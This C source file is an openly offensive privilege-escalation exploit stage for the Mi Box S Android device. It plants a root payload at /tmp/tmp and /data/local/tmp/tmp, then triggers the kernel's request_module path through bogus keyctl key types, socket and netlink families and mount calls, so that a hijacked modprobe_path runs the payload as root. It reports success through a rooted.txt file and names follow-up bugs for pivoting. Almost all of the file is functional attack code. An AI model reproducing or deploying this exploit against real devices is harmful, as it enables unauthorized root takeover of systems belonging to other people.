/*
 * trigger_modprobe.c - Robust multi-vector modprobe trigger (Mi Box S)
 *
 * modprobe_path has already been overwritten to "/tmp/tmp" by
 * kort_modprobe_2step (the only writable string with our 4-byte-repeat
 * BIND_MEM write primitive on a 64-bit kernel).
 *
 * This binary:
 *   1) deploys the root payload to BOTH
 *        /data/local/tmp/tmp   (always creatable; catches /tmp -> /data/local/tmp symlink)
 *        /tmp/tmp              (if /tmp is a real writable dir)
 *      so the kernel execs the payload as root when it calls modprobe_path.
 *   2) fires request_module() via every unprivileged vector we can reach
 *      under SELinux (keyctl is the most reliable - proven by the frels
 *      reference exploits which lean heavily on add_key/keyctl).
 *   3) reports whether rooted.txt appeared.
 *
 * Build (NDK 21.4, 32-bit armeabi-v7a, static):
 *   %CLANG% trigger_modprobe.c -o trigger_modprobe -static
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <netinet/in.h>

/* ---- 32-bit ARM syscall numbers ---- */
#ifndef __NR_request_key
#define __NR_request_key 310
#endif
#ifndef __NR_add_key
#define __NR_add_key    309
#endif
#ifndef __NR_keyctl
#define __NR_keyctl     311
#endif

/* keyctl commands / special keyring ids (not relying on <linux/keyctl.h>) */
#ifndef KEYCTL_SEARCH
#define KEYCTL_SEARCH 10
#endif
#define KEY_SPEC_PROCESS_KEYRING ((int32_t)-2)

static int g_total = 0;

/* ---- payload deploy ---- */
static int copy_file(const char *src, const char *dst) {
    int in = open(src, O_RDONLY);
    if (in < 0) return -1;
    int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (out < 0) { close(in); return -1; }
    char buf[4096];
    ssize_t n;
    while ((n = read(in, buf, sizeof(buf))) > 0) {
        ssize_t off = 0;
        while (off < n) {
            ssize_t w = write(out, buf + off, n - off);
            if (w <= 0) break;
            off += w;
        }
    }
    close(in);
    close(out);
    chmod(dst, 0755);
    return 0;
}

static void deploy_payload(void) {
    const char *src = "/data/local/tmp/x_payload";
    struct stat st;
    if (stat(src, &st) != 0) {
        /* fallback: minimal test payload so the chain is still testable */
        printf("  [deploy] x_payload missing, writing minimal test payload\n");
        int fd = open("/data/local/tmp/tmp", O_WRONLY | O_CREAT | O_TRUNC, 0755);
        if (fd >= 0) {
            const char *s = "#!/system/bin/sh\nid > /data/local/tmp/rooted.txt 2>&1\n";
            write(fd, s, strlen(s));
            close(fd);
            chmod("/data/local/tmp/tmp", 0755);
        }
        return;
    }
    printf("  [deploy] x_payload found (%d bytes)\n", (int)st.st_size);

    /* Always create at /data/local/tmp/tmp.
     * If /tmp is a symlink to /data/local/tmp, then the kernel's "/tmp/tmp"
     * resolves exactly here and the payload runs. */
    if (copy_file(src, "/data/local/tmp/tmp") == 0)
        printf("  [deploy] -> /data/local/tmp/tmp OK\n");
    else
        printf("  [deploy] -> /data/local/tmp/tmp FAILED (%s)\n", strerror(errno));

    /* Also try a real /tmp/tmp in case /tmp is an actual writable directory. */
    if (copy_file(src, "/tmp/tmp") == 0)
        printf("  [deploy] -> /tmp/tmp OK\n");
    else
        printf("  [deploy] -> /tmp/tmp not possible (this is fine if /tmp is a symlink)\n");
}

/* ---- trigger vectors ---- */

/* Most reliable unprivileged request_module source under SELinux.
 * A non-existent key *type* makes the kernel call
 *   request_module("key-type-<type>")
 * which invokes our overwritten modprobe_path. */
static int try_keyctl_triggers(void) {
    int count = 0;
    const char *bogus = "kort_zzz_12345";
    syscall(__NR_request_key, bogus, "desc", (void *)NULL,
            (int32_t)KEY_SPEC_PROCESS_KEYRING);
    count++;
    syscall(__NR_add_key, bogus, "desc", "p", 1,
            (int32_t)KEY_SPEC_PROCESS_KEYRING);
    count++;
    syscall(__NR_keyctl, KEYCTL_SEARCH, (int32_t)KEY_SPEC_PROCESS_KEYRING,
            bogus, "desc", (int32_t)KEY_SPEC_PROCESS_KEYRING);
    count++;
    return count;
}

static int try_socket_triggers(void) {
    int count = 0;
    int pfs[] = {
        3,4,5,6,9,10,11,12,13,15,16,18,20,22,23,24,25,26,27,28,29,
        30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45
    };
    for (int i = 0; i < (int)(sizeof(pfs)/sizeof(pfs[0])); i++) {
        int s;
        if ((s = socket(pfs[i], SOCK_DGRAM, 0)) >= 0) { close(s); count++; }
        if ((s = socket(pfs[i], SOCK_STREAM, 0)) >= 0) { close(s); count++; }
        if ((s = socket(pfs[i], SOCK_RAW, 0)) >= 0) { close(s); count++; }
    }
    return count;
}

static int try_netlink_triggers(void) {
    int count = 0;
    int protos[] = {1,2,3,4,5,6,7,9,10,11,12,13,15,16,17,18,19,20,21};
    for (int i = 0; i < (int)(sizeof(protos)/sizeof(protos[0])); i++) {
        int s = socket(AF_NETLINK, SOCK_RAW, protos[i]);
        if (s >= 0) { close(s); count++; }
    }
    return count;
}

/* mount() of an unknown fstype normally triggers request_module("fs-<type>"),
 * but under SELinux shell it is usually blocked before reaching the module
 * path. Kept only as a best-effort attempt. */
static int try_mount_triggers(void) {
    int count = 0;
    const char *fstypes[] = {
        "bogus_fs_kort_12345", "ext4", "f2fs", "vfat", "ntfs", "btrfs",
        "xfs", "cifs", "nfs", "iso9660", "udf", "squashfs", "cramfs"
    };
    mkdir("/data/local/tmp/mnt_test", 0755);
    for (int i = 0; i < (int)(sizeof(fstypes)/sizeof(fstypes[0])); i++) {
        mount("/dev/block/loop0", "/data/local/tmp/mnt_test", fstypes[i], 0, NULL);
        count++;
    }
    rmdir("/data/local/tmp/mnt_test");
    return count;
}

static void report_tmp(void) {
    struct stat st;
    printf("\n[*] /tmp status:\n");
    if (lstat("/tmp", &st) == 0) {
        if (S_ISLNK(st.st_mode)) {
            char link[256] = {0};
            readlink("/tmp", link, sizeof(link)-1);
            printf("    /tmp is a SYMLINK -> %s\n", link);
            printf("    => kernel '/tmp/tmp' resolves to %s/tmp\n", link);
        } else if (S_ISDIR(st.st_mode)) {
            printf("    /tmp is a DIRECTORY (mode 0%o)\n", st.st_mode & 0777);
        } else {
            printf("    /tmp is something else (mode 0%o)\n", st.st_mode & 0777);
        }
    } else {
        printf("    /tmp does NOT exist -> exploit CANNOT deliver payload here\n");
        printf("    (need /tmp -> /data/local/tmp symlink, or arbitrary-write primitive)\n");
    }
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Mi Box S modprobe trigger\n");
    printf("[*] modprobe_path should already be \"/tmp/tmp\"\n\n");

    printf("[*] Deploying root payload...\n");
    deploy_payload();

    printf("\n[*] Firing request_module vectors...\n");

    printf("  [1] keyctl (request_key/add_key/keyctl_search bogus type)... ");
    int c = try_keyctl_triggers();
    printf("%d calls\n", c); g_total += c;

    printf("  [2] socket protocol families... ");
    c = try_socket_triggers();
    printf("%d calls\n", c); g_total += c;

    printf("  [3] netlink protocols... ");
    c = try_netlink_triggers();
    printf("%d calls\n", c); g_total += c;

    printf("  [4] mount bogus fstypes (best-effort, usually SELinux-blocked)... ");
    c = try_mount_triggers();
    printf("%d calls\n", c); g_total += c;

    printf("\n[*] Total trigger attempts: %d\n", g_total);

    /* give the async usermodehelper time to run */
    sleep(3);

    report_tmp();

    struct stat st;
    if (stat("/data/local/tmp/rooted.txt", &st) == 0) {
        printf("\n[+] rooted.txt EXISTS! (%d bytes)\n", (int)st.st_size);
        printf("--- contents ---\n");
        FILE *f = fopen("/data/local/tmp/rooted.txt", "r");
        if (f) {
            char buf[512];
            while (fgets(buf, sizeof(buf), f)) printf("%s", buf);
            fclose(f);
        }
        printf("--- end ---\n");
        printf("[+] CHAIN WORKS - you have root via modprobe_path\n");
    } else {
        printf("\n[-] rooted.txt not found yet.\n");
        printf("    Next: confirm /tmp exists; if not, the BIND_MEM primitive\n");
        printf("    cannot write an arbitrary path on 64-bit -> need arbitrary-write\n");
        printf("    (per-pixel shader, or pivot to the Mali UAF+spray bug).\n");
    }
    return 0;
}
